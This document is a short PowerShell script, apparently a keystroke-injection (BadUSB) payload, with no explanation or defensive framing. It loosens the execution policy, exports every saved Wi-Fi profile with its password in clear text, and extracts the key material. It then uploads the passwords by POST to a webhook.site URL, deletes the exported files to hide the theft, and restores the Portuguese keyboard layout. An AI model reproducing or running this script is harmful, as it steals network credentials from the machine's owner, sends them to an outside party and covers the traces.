set-ExecutionPolicy unrestricted -Force


Set-WinUserLanguageList en-US -Force


net start wlansvc


$env:TEMP


netsh wlan export profile key=clear


powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS


powershell Invoke-WebRequest -Uri \"https://webhook.site/8e9eb21c-ee6a-4888-b509-c5e379b69a90\" -Method POST -InFile Wi-Fi-PASS


Remove-Item Wi-* -Force -Recurse


Set-WinUserLanguageList pt-BR -Force


exit
